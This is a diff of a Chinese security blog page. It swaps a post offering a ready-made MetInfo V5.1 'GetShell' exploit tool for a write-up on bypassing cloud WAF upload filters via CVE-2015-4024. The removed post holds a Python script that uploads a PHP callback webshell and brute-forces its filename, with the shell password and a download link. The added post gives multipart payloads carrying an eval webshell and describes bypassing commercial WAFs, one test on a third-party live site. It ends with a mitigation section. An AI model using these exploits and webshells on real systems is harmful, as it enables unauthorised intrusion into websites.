@@ -89,7 +89,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hacker,Tools," />
+  <meta name="keywords" content="Hacker," />
 
 
 
@@ -107,21 +107,23 @@
 
 
 
-<meta name="description" content="漏洞解析：
-config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&amp;gt;get_one(&quot;SELECT * FROM $met_lang WHERE lang=&apos;$lang&apos;&quot;);if(!$langoks)die(&apos;No data in the database,plea">
+<meta name="description" content="1.     背景介绍今天我们想从2015.04.03的一个PHP远程dos漏洞（CVE-2015-4024）说起。技术细节见如下链接，https://bugs.php.net/bug.php?id=69364。因为php解析body part的header时进行字符串拼接，而拼接过程重复拷贝字符导致DOS。事实上该漏洞还有其他非dos的利用价值，其中之一，就是绕过当前各种云WAF的文件上传防御策">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MetInfo V5.1 GetShell一键化工具">
-<meta property="og:url" content="http://hacktech.cn/2016/06/08/ciztyc5dq0007iwvq448vi5hf.html">
+<meta property="og:title" content="PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed">
+<meta property="og:url" content="http://akkuman.coding.me/2016/09/24/ciztyiyt6000fqkvq9xyd58ei.html">
 <meta property="og:site_name" content="Akkuman Blog">
-<meta property="og:description" content="漏洞解析：
-config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&amp;gt;get_one(&quot;SELECT * FROM $met_lang WHERE lang=&apos;$lang&apos;&quot;);if(!$langoks)die(&apos;No data in the database,plea">
-<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png">
-<meta property="og:updated_time" content="2016-10-29T07:07:05.903Z">
+<meta property="og:description" content="1.     背景介绍今天我们想从2015.04.03的一个PHP远程dos漏洞（CVE-2015-4024）说起。技术细节见如下链接，https://bugs.php.net/bug.php?id=69364。因为php解析body part的header时进行字符串拼接，而拼接过程重复拷贝字符导致DOS。事实上该漏洞还有其他非dos的利用价值，其中之一，就是绕过当前各种云WAF的文件上传防御策">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apwul8mrj30r50fptbm.jpg">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apy2esg5j311v0ifdjx.jpg">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apztziwvj30vm0g9af6.jpg">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq0sw1luj30wb0f9wjf.jpg">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq1mvbrqj30vr0elwh2.jpg">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq30m0wjj31050etdko.jpg">
+<meta property="og:updated_time" content="2016-09-25T09:10:36.645Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MetInfo V5.1 GetShell一键化工具">
-<meta name="twitter:description" content="漏洞解析：
-config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&amp;gt;get_one(&quot;SELECT * FROM $met_lang WHERE lang=&apos;$lang&apos;&quot;);if(!$langoks)die(&apos;No data in the database,plea">
-<meta name="twitter:image" content="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png">
+<meta name="twitter:title" content="PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed">
+<meta name="twitter:description" content="1.     背景介绍今天我们想从2015.04.03的一个PHP远程dos漏洞（CVE-2015-4024）说起。技术细节见如下链接，https://bugs.php.net/bug.php?id=69364。因为php解析body part的header时进行字符串拼接，而拼接过程重复拷贝字符导致DOS。事实上该漏洞还有其他非dos的利用价值，其中之一，就是绕过当前各种云WAF的文件上传防御策">
+<meta name="twitter:image" content="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apwul8mrj30r50fptbm.jpg">
 
 
 
@@ -149,13 +151,13 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
 
 
 
-  <link rel="canonical" href="http://hacktech.cn/2016/06/08/ciztyc5dq0007iwvq448vi5hf.html"/>
+  <link rel="canonical" href="http://akkuman.coding.me/2016/09/24/ciztyiyt6000fqkvq9xyd58ei.html"/>
 
 
 
 
 
-  <title> MetInfo V5.1 GetShell一键化工具 | Akkuman Blog </title>
+  <title> PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed | Akkuman Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -328,7 +330,7 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://hacktech.cn/2016/06/08/ciztyc5dq0007iwvq448vi5hf.html">
+    <link itemprop="mainEntityOfPage" href="http://akkuman.coding.me/2016/09/24/ciztyiyt6000fqkvq9xyd58ei.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Akkuman">
@@ -349,7 +351,7 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
             
             
               
-                MetInfo V5.1 GetShell一键化工具
+                PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed
               
             
           </h1>
@@ -364,8 +366,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-06-08T22:40:32+08:00">
-                2016-06-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-09-24T13:20:39+08:00">
+                2016-09-24
               </time>
             
 
@@ -405,8 +407,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2016/06/08/ciztyc5dq0007iwvq448vi5hf.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/06/08/ciztyc5dq0007iwvq448vi5hf.html" itemprop="commentCount"></span>
+                <a href="/2016/09/24/ciztyiyt6000fqkvq9xyd58ei.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/24/ciztyiyt6000fqkvq9xyd58ei.html" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -432,48 +434,32 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
       
 
       
-        <hr>
-<h1 id="漏洞解析："><a href="#漏洞解析：" class="headerlink" title="漏洞解析："></a>漏洞解析：</h1><hr>
-<p><strong>config/config.inc.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">$langoks = $db-&gt;get_one(<span class="string">"SELECT * FROM $met_lang WHERE lang='$lang'"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$langoks)<span class="keyword">die</span>(<span class="string">'No data in the database,please reinstall.'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$langoks[useok]&amp;&amp;!$metinfoadminok)okinfo(<span class="string">'../404.html'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(count($met_langok)==<span class="number">1</span>)$lang=$met_index_type;</div><div class="line"></div><div class="line">$query = <span class="string">"SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'"</span>;<span class="comment">//看这里</span></div><div class="line"></div><div class="line">$result = $db-&gt;query($query);</div><div class="line"></div><div class="line"><span class="keyword">while</span>($list_config= $db-&gt;fetch_array($result))&#123;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($metinfoadminok)$list_config[<span class="string">'value'</span>]=str_replace(<span class="string">'"'</span>, <span class="string">'&amp;#34;'</span>, str_replace(<span class="string">"'"</span>, <span class="string">'&amp;#39;'</span>,$list_config[<span class="string">'value'</span>]));</div><div class="line"></div><div class="line">	$settings_arr[]=$list_config;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($list_config[<span class="string">'columnid'</span>])&#123;</div><div class="line"></div><div class="line">		$settings[$list_config[<span class="string">'name'</span>].<span class="string">'_'</span>.$list_config[<span class="string">'columnid'</span>]]=$list_config[<span class="string">'value'</span>];</div><div class="line"></div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">		$settings[$list_config[<span class="string">'name'</span>]]=$list_config[<span class="string">'value'</span>];</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">@extract($settings);</div></pre></td></tr></table></figure></p>
-<hr>
+        <h1 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1.     背景介绍"></a>1.     背景介绍</h1><p>今天我们想从2015.04.03的一个PHP远程dos漏洞（CVE-2015-4024）说起。技术细节见如下链接，<a href="https://bugs.php.net/bug.php?id=69364" target="_blank" rel="external">https://bugs.php.net/bug.php?id=69364</a>。因为php解析body part的header时进行字符串拼接，而拼接过程重复拷贝字符导致DOS。事实上该漏洞还有其他非dos的利用价值，其中之一，就是绕过当前各种云WAF的文件上传防御策略。</p>
+<p>目前国内外流行的云WAF厂商有如百度云加速，360网站卫士，加速乐，云盾等。因为PHP远程dos漏洞及PHP官方修复方案的特点，我们成功利用该漏洞绕过了当前主流WAF的文件上传防御，例如百度云加速、360网站卫士、知道创于加速乐、安全狗。</p>
+<p>接下来，我们以PHP为例，详细解析我们的绕过方法。</p>
+<h1 id="2-绕过WAF的原理"><a href="#2-绕过WAF的原理" class="headerlink" title="2.     绕过WAF的原理"></a>2.     绕过WAF的原理</h1><p>根据PHP DOS漏洞原理，在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符’:’，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块，从而导致DOS。</p>
 <a id="more"></a>
-<p>访问</p>
-<p><a href="http:///localhost/metinfo5.1/index.php?lang=metinfo" target="_blank" rel="external">http:///localhost/metinfo5.1/index.php?lang=metinfo</a></p>
-<p><code>SELECT * FROM met_config WHERE lang=&#39;metinfo&#39; or lang=&#39;metinfo&#39;</code></p>
-<hr>
-<h2 id="文件命名方式："><a href="#文件命名方式：" class="headerlink" title="文件命名方式："></a>文件命名方式：</h2><hr>
-<p><strong>/feedback/uploadfile_save.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">srand((double)microtime() * <span class="number">1000000</span>);</div><div class="line"></div><div class="line">$rnd = rand(<span class="number">100</span>, <span class="number">999</span>);</div><div class="line"></div><div class="line">$name = date(<span class="string">'U'</span>) + $rnd;</div><div class="line"></div><div class="line">$name = $name.<span class="string">"."</span>.$ext;</div></pre></td></tr></table></figure></p>
-<p><strong>文件保存在/upload/file/目录</strong></p>
-<p>命名方式就是时间戳去掉后三位，紧接着一个三位数的随机数</p>
-<p>可爆破：</p>
-<p>如</p>
-<p><a href="http://127.0.0.1/upload/file/1465394396.php" target="_blank" rel="external">http://127.0.0.1/upload/file/1465394396.php</a></p>
-<hr>
-<h1 id="一键化利用工具："><a href="#一键化利用工具：" class="headerlink" title="一键化利用工具："></a>一键化利用工具：</h1><hr>
-<p><strong>本程序基于python编写</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> Queue</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"></div><div class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.10 Safari/537.36'</span>&#125;</div><div class="line"></div><div class="line">urls = Queue.Queue()</div><div class="line"><span class="comment">#http://hb.jhxjd.com/upload/file/1441445378.php</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp</span><span class="params">(urls,time_out)</span>:</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> urls.empty():</div><div class="line">        base_url = urls.get()</div><div class="line">        response = <span class="keyword">None</span></div><div class="line"></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            time.sleep(int(time_out))<span class="comment">#延时设置</span></div><div class="line">            response = requests.get(base_url,headers=headers)</div><div class="line">            <span class="keyword">if</span> response.status_code == <span class="number">404</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">'Not Fount----%s\n'</span> % base_url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            <span class="keyword">if</span> response:</div><div class="line">                <span class="keyword">with</span> open(<span class="string">'url.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</div><div class="line">                    f.write(<span class="string">'%s?e=YXNzZXJ0\n'</span>%base_url)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(target_url,thread_num,time_out)</span>:</span></div><div class="line"></div><div class="line">    <span class="comment">#取出当前时间戳并删除后四位</span></div><div class="line">    now = str(int(time.time()))[:<span class="number">-4</span>]</div><div class="line"></div><div class="line">    <span class="comment">#将所有的待爆破地址遍历并加入队列</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">1000</span>):</div><div class="line">            num_str = <span class="string">''</span>.join((str(i),str(j)))</div><div class="line">            url = <span class="string">''</span>.join((<span class="string">'%s/upload/file/%s'</span> % (target_url,now),num_str,<span class="string">'.php'</span>))</div><div class="line">            urls.put(url)</div><div class="line"></div><div class="line">    <span class="comment">#上传文件</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'xiaoma.php'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> fi:</div><div class="line">        fi.write(<span class="string">"&lt;?php $e = $_REQUEST['e'];register_shutdown_function(base64_decode($e), $_REQUEST['Akkuman']);?&gt;"</span>)</div><div class="line">    data = &#123;</div><div class="line">            <span class="string">'fd_para[1][para]'</span>:<span class="string">'filea'</span>,</div><div class="line">            <span class="string">'fd_para[1][type]'</span>:<span class="string">'5'</span></div><div class="line">            &#125;</div><div class="line">    files = &#123;<span class="string">'filea'</span>: open(<span class="string">"xiaoma.php"</span>, <span class="string">'rb'</span>)&#125;</div><div class="line">    upload_url = <span class="string">'%s/feedback/uploadfile_save.php?met_file_format=pphphp&amp;met_file_maxsize=9999&amp;lang=metinfo'</span> % target_url</div><div class="line">    res = requests.post(upload_url,data = data,files=files)</div><div class="line">    <span class="comment">#等待两秒  文件上传</span></div><div class="line">    time.sleep(<span class="number">2</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">#启动多线程</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(thread_num)):</div><div class="line">        t = threading.Thread(target = bp,args=(urls,time_out,))</div><div class="line">        t.start()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'Example : %s http://www.xxx.com 20 0'</span> % sys.argv[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        main(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>],sys.argv[<span class="number">3</span>])</div></pre></td></tr></table></figure>
-<p>程序略显粗糙</p>
-<p>为了方便，我也把他打包成了<strong>exe</strong></p>
-<p>然后闲着没事，想着简单地给他做了个<strong>界面</strong>,这样的<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png" alt="GUI"></p>
-<hr>
-<h1 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h1><hr>
-<blockquote>
-<p>MetInfo V5.1上传漏洞getshell利用工具</p>
-<p>   作者 : Akkuman</p>
-<p>漏洞原理详见<a href="http://www.wooyun.org/bugs/wooyun-2010-0139168" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0139168</a></p>
-<p>使用说明：<br>本目录有两个文件，一个py，一个exe<br>因为exe是py文件打包而成，故文件较大<br>64位系统测试使用通过</p>
-<p>如果你安装了py2.x环境  py文件使用方法<br>打开cmd<br>python baopo.py <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
-<p>exe命令行文件使用方法<br>打开cmd<br>baopo.exe <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
-<p>GUI程序，应该不用说</p>
-<p>关于getshell与结果<br>上传的是回调一句话木马<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="meta">&lt;?php</span> &gt;$e=$_REQUEST[<span class="string">'e'</span>];register_shutdown_function(base64_decode($e),$_&gt;REQUEST[<span class="string">'Akkuman'</span>]);<span class="meta">?&gt;</span></div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
-<p>菜刀连接，密码是Akkuman</p>
-<p>爆破结果会生成在<strong>url.txt</strong></p>
-</blockquote>
-<hr>
-<h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><hr>
-<p><a href="http://cloud.189.cn/t/v263QbMJVJ3u" target="_blank" rel="external">(访问码:1475)</a></p>
-<p><em>转载请注明出处</em></p>
-<p><em>作者博客 hacktech.cn | 53xiaoshuo.com</em></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">prev_len= strlen(prev_entry.value);</div><div class="line"></div><div class="line">cur_len= strlen(line);</div><div class="line"></div><div class="line">entry.value= emalloc(prev_len + cur_len + <span class="number">1</span>); <span class="comment">//1次分片内存</span></div><div class="line"></div><div class="line">memcpy(entry.value,prev_entry.value, prev_len); <span class="comment">//1次拷贝</span></div><div class="line"></div><div class="line">memcpy(entry.value+ prev_len, line, cur_len);   <span class="comment">//1次拷贝</span></div><div class="line"></div><div class="line">entry.value[cur_len+ prev_len] = <span class="string">'\0'</span>;</div><div class="line"></div><div class="line">entry.key= estrdup(prev_entry.key);</div><div class="line"></div><div class="line">zend_llist_remove_tail(header);<span class="comment">//1次内存释放</span></div></pre></td></tr></table></figure>
+<p>而PHP官方修复方案，在进行合并时，避免重复拷贝，从而避免DOS。绕过WAF的关键在于，PHP multipart_buffer_headers函数解析header对应value时，value值存在多行。每行的字符串以空白符开头或不存字符’:’，将进行合并。而WAF在解析文件上传的文件名时，没有考虑协议兼容，不进行多行合并，就可以被绕过。</p>
+<p>根据原理构造绕过WAF文件上传防御的payload，WAF解析到的文件名为”test3.jpg”，而PHP解析到的文件名是”test3.jpg\nf/shell.php”，因为”/”是目录分隔符，上传的文件名变为shell.php。以下是绕过paylaod、测试脚本、paylaod进行文件上传的效果图。</p>
+<h2 id="WAF绕过payload"><a href="#WAF绕过payload" class="headerlink" title="WAF绕过payload:"></a>WAF绕过payload:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div><div class="line"></div><div class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test3.jpg\nsf/shell.php</div><div class="line"></div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line">&lt;?php eval($_GET[&apos;c&apos;])?&gt;</div><div class="line"></div><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div></pre></td></tr></table></figure>
+<h2 id="文件上传功能测试脚本："><a href="#文件上传功能测试脚本：" class="headerlink" title="文件上传功能测试脚本："></a>文件上传功能测试脚本：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">         $name = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> $name;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"></div><div class="line">        move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>] , <span class="string">'/usr/local/nginx/html/upload/'</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"upload success! "</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> strlen($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>Payload能够正常上传</p>
+<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apwul8mrj30r50fptbm.jpg" alt="1"></p>
+<h1 id="3-绕过WAF实战"><a href="#3-绕过WAF实战" class="headerlink" title="3.     绕过WAF实战"></a>3.     绕过WAF实战</h1><p>笔者通过搭建自己的测试站，接入360网站卫士和加速乐，验证绕过WAF文件上传防御的方法。</p>
+<h2 id="3-1-绕过360网站卫士"><a href="#3-1-绕过360网站卫士" class="headerlink" title="3.1 绕过360网站卫士"></a>3.1 绕过360网站卫士</h2><h3 id="步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。"><a href="#步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。"></a>步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apy2esg5j311v0ifdjx.jpg" alt="2"></p>
+<h3 id="步骤2：成功绕过360网站卫士，上传shell成功，文件是apo-php。在该请求中，有没有Content-Type不影响绕过。"><a href="#步骤2：成功绕过360网站卫士，上传shell成功，文件是apo-php。在该请求中，有没有Content-Type不影响绕过。" class="headerlink" title="步骤2：成功绕过360网站卫士，上传shell成功，文件是apo.php。在该请求中，有没有Content-Type不影响绕过。"></a>步骤2：成功绕过360网站卫士，上传shell成功，文件是apo.php。在该请求中，有没有Content-Type不影响绕过。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apztziwvj30vm0g9af6.jpg" alt="3"></p>
+<h2 id="3-2-绕过知道创宇加速乐"><a href="#3-2-绕过知道创宇加速乐" class="headerlink" title="3.2 绕过知道创宇加速乐"></a>3.2 绕过知道创宇加速乐</h2><h3 id="步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。"><a href="#步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。"></a>步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq0sw1luj30wb0f9wjf.jpg" alt="4"></p>
+<h3 id="步骤二：成功绕过加速乐，上传shell，文件是syt-php。"><a href="#步骤二：成功绕过加速乐，上传shell，文件是syt-php。" class="headerlink" title="步骤二：成功绕过加速乐，上传shell，文件是syt.php。"></a>步骤二：成功绕过加速乐，上传shell，文件是syt.php。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq1mvbrqj30vr0elwh2.jpg" alt="5"></p>
+<h2 id="3-3-绕过百度云加速"><a href="#3-3-绕过百度云加速" class="headerlink" title="3.3. 绕过百度云加速"></a>3.3. 绕过百度云加速</h2><p>百度云加速与CloudFlare，从百度匀加速拦截页面可以看出使用的是CloudFlare. 但是估计有本地化，百度云加速应该是百度和CloudFlare共同产物吧。测试百度没有搭建自己的测试环境，找了个接入了百度云加速的站进行测试。</p>
+<h3 id="步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。"><a href="#步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。"></a>步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq30m0wjj31050etdko.jpg" alt="6"></p>
+<h3 id="步骤二：成功绕过云加速"><a href="#步骤二：成功绕过云加速" class="headerlink" title="步骤二：成功绕过云加速"></a>步骤二：成功绕过云加速</h3><p>同上</p>
+<h1 id="4-扩展—更多的工作"><a href="#4-扩展—更多的工作" class="headerlink" title="4.     扩展—更多的工作"></a>4.     扩展—更多的工作</h1><h2 id="4-1-分析filename其他字符的绕过"><a href="#4-1-分析filename其他字符的绕过" class="headerlink" title="4.1 分析filename其他字符的绕过"></a>4.1 分析filename其他字符的绕过</h2><p>同理，我们发现除了双引号外，使用单引号也能绕过WAF的防御，并实现文件上传。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div><div class="line"></div><div class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&apos;test3.jpg\nsf/shell.php</div><div class="line"></div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line">&lt;?php eval($_GET[&apos;c&apos;])?&gt;</div><div class="line"></div><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div></pre></td></tr></table></figure>
+<h2 id="4-2-分析其他应用脚本语言"><a href="#4-2-分析其他应用脚本语言" class="headerlink" title="4.2 分析其他应用脚本语言"></a>4.2 分析其他应用脚本语言</h2><p>我们也发现jsp解析也有自己的特点，同时可被用于绕过WAF。暂时未测试asp,aspx,python等常用的WEB应用脚本语言。</p>
+<h1 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5.     修复方案"></a>5.     修复方案</h1><h2 id="5-1-修复方案一"><a href="#5-1-修复方案一" class="headerlink" title="5.1 修复方案一"></a>5.1 修复方案一</h2><p>解析文件上传请求时，如果发现请求不符合协议规范，则拒绝请求。可能会产生误拦截，需要评估误拦截的影响范围。</p>
